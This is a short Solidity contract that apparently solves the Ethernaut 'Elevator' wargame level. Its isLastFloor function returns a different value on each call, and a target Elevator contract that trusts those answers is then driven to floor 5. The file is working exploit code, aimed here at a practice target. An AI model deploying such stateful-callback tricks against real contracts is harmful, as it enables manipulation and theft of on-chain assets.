pragma solidity^ 0.8.0;

import "./Elevator.sol";

contract encodeWithSignature{
    Elevator E;
    bool t = true;
    function exploit(address _addr)public {
        E = Elevator(_addr);
    }
    function isLastFloor(uint) external returns(bool){
        t = !t;
        return t;
    }
    function attack()public {
        E.goTo(5);
    }
}

